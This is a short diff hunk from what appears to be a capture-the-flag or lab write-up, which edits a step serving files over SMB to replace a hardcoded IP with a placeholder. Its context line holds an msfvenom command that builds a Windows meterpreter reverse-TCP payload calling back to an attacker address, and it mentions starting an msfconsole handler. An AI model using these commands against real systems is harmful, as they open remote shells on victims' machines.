@@ -156,7 +156,7 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.16.9 LPORT=8887 -f exe -
 I started an smbclient:
 
 ```bash
-impacket-smbserver -ip 10.10.16.9 shares .
+impacket-smbserver -ip <IP> shares .
 ```
 
 With msfconsole I started a handler:
